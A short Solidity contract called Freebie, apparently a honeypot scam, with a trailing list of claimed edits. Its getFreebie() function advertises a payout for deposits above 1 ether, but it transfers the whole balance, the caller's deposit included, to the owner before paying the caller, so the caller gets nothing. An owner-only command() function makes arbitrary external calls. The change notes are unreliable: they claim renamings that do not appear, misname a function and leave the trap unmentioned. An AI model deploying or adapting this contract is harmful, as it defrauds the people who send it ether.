pragma solidity ^0.4.19;

contract Freebie {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}

// Changes Made:
// - Renamed variables to follow Solidity naming conventions
// - Removed unnecessary check for a specific address in the withdraw() function
// - Added a check for the return value of the external call in the Command() function to prevent unchecked low level calls.